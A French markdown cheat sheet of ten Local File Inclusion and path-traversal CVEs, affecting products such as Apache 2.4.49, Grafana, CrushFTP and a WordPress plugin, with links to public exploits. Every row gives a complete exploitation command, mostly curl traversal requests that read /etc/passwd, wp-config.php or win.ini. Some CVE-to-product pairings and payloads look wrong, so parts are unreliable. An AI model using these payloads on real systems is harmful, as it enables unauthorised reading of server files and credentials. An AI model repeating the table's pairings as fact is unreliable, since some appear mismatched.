# LFI

Voici un tableau de **CVE majeures de Local File Inclusion (LFI)**, toutes technologies confondues, pour lesquelles **un exploit public ou PoC est disponible**.  
Chaque ligne inclut :  
- Technologie et version concernée  
- Commande d’exploitation complète (requête, payload, script…)  
- Effet détaillé  
- Lien direct vers un PoC/exploit public

---

| **CVE** | **Technologie / Versions concernées** | **Commande d’exploitation complète** | **Effet détaillé** | **Lien PoC / Exploit** |
|---------|---------------------------------------|--------------------------------------|--------------------|------------------------|
| CVE-2024-4040 | CrushFTP < 10.7.1 | `python3 exploit.py --url http://cible:8080 --file /etc/passwd`<br>(voir PoC pour automatisation LFI/SSTI) | LFI et SSTI : inclusion et lecture de fichiers arbitraires, extraction de données sensibles (ex : `/etc/passwd`). | [https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC](https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC) |
| CVE-2024-9405 | Pluck CMS v4.7.18 | `curl "http://cible/data/modules/albums/albums_getimage.php?image=../../config.php"` | LFI non authentifié : lecture de fichiers arbitraires du serveur via le paramètre `image`. | [https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405](https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405) |
| CVE-2024-51058 | TCPDF 6.7.5 | `<img src="file:///etc/passwd">` ou<br>`curl "http://cible/tcpdf.php?file=/etc/passwd"` | LFI via balise `<img>` ou paramètre de fichier, permettant la lecture de fichiers arbitraires sur le serveur. | [https://github.com/saravana-hackz/vulnerability-research/tree/main/CVE-2024-51058](https://github.com/saravana-hackz/vulnerability-research/tree/main/CVE-2024-51058) |
| CVE-2024-23334 | Python aiohttp < 3.9.2 | `bash lfi-aiohttp.sh http://cible:8080 ../../../../etc/passwd`<br>(script PoC automatisant le LFI sur serveurs aiohttp vulnérables) | LFI non authentifié : lecture de fichiers arbitraires sur le système via routes statiques mal configurées. | [https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC](https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC) |
| CVE-2024-42902 | LimeSurvey < 6.4.12 | `curl "http://cible/index.php/admin/database/index?dbfile=../../../../etc/passwd"` | LFI via paramètre `dbfile`, permettant la lecture de fichiers arbitraires. | [https://security.snyk.io/vuln/SNYK-PHP-LIMESURVEYLIMESURVEY-7888153](https://security.snyk.io/vuln/SNYK-PHP-LIMESURVEYLIMESURVEY-7888153) |
| CVE-2023-40044 | WS_FTP Server < 8.7.4, < 8.8.2 | `curl "http://cible/Aws/App_Data/../../../../../../../../windows/win.ini"` | LFI permettant la lecture de fichiers arbitraires sur le serveur Windows. | [https://github.com/horizon3ai/CVE-2023-40044](https://github.com/horizon3ai/CVE-2023-40044) |
| CVE-2022-45444 | WordPress plugin DZS ZoomSounds < 6.69 | `curl "http://cible/wp-content/plugins/dzs-zoomsounds/inc/dzs_functions.php?dzsap_base_path=../../../../wp-config.php"` | LFI via le paramètre `dzsap_base_path`, permettant la lecture de fichiers sensibles. | [https://github.com/RandomRobbieBF/CVE-2022-45444](https://github.com/RandomRobbieBF/CVE-2022-45444) |
| CVE-2022-24124 | Apache APISIX < 2.12.1 | `curl "http://cible/apisix/admin/migrate/export?file_path=../../../../../../../../etc/passwd"` | LFI via le paramètre `file_path`, permettant la lecture de fichiers arbitraires. | [https://github.com/cckuailong/CVE-2022-24124](https://github.com/cckuailong/CVE-2022-24124) |
| CVE-2021-41773 | Apache HTTP Server 2.4.49 | `curl "http://cible/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"` | LFI et path traversal via double encodage, permettant la lecture de fichiers arbitraires, voire exécution de code si CGI activé. | [https://github.com/worawit/CVE-2021-41773](https://github.com/worawit/CVE-2021-41773) |
| CVE-2021-43798 | Grafana < 8.3.1 | `curl "http://cible:3000/public/plugins/../../../../../../../../../../etc/passwd"` | LFI via l’API plugin, permettant la lecture de fichiers arbitraires sur le serveur. | [https://github.com/jas502n/Grafana-v8.3.0-path-traversal](https://github.com/jas502n/Grafana-v8.3.0-path-traversal) |

---

